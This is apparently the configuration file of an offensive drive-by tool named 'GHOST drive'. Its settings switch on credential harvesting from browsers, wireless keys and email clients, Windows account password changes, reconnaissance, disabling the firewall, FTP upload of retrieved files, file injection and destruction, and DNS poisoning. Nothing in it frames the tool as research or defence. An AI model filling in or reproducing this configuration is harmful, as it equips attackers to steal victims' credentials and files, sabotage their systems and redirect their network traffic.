# ->initializing controls
uac_elevation = 0
duplicate_exec = 1
stub = "media.txt"
logging = 0

# ->completion controls
msgbox = {
    'controller': 1,
    'title': "GHOST drive",
    'msg': "Driveby complete",
    'buttons': 0
}
power = {
    'controller': 0,
    'mode': "s",
    'comment': "a message",
    'timeout': "999"
}

sound = 1

# ->password recovery
browser_pwds = 0
wireless_keys = 0
email_pst_pwds = 0
mail_pwds = 0
network_pwds = 0
msn_pwds = 0
dialup_pwds = 0

# ->password moding
change_nt_pwd = {
    'current_acc_controller': 0,
    'current_acc_pwd': "",
    'diff_acc_controller': 0,
    'diff_acc_usr': "Ebrahim",
    'diff_acc_pwd': "a password"
}

# ->reconnaissance
batch_recon = 0
network_scan = 0
sysinfo = 0

# ->network based executions
disable_firewall = 0
enable_firewall = 0
release_net_adapters = 0
renew_net_adapters = 0
flush_dns = 0
register_dns = 0

# ->ftp
ftp = {
    'controller': 0,
    'host': "",
    'port': 21,
    'username': "",
    'password': "",
    'dir': ""
}

# ->file utilities
injector = {
    'controller': 0,
    'var_case': 0,
    'path': ""
}
retriever = {
    'controller': 0,
    'var_case': 0,
    'var_case_dir': 0,
    'path': ""
}
destroyer = {
    'controller': 0,
    'var_case': 0,
    'var_case_dir': 0,
    'path': ""
}

# ->custom executions
local_exec = 0
target_exec = {
    'controller': 0,
    'path': ""
}

# ->DNS based attacks
dns_halt = {
    'controller': 0,
    'clear': 1,
    'entries': ""
}

dns_poison = {
    'controller': 0,
    'clear': 1,
    'entries': ""
}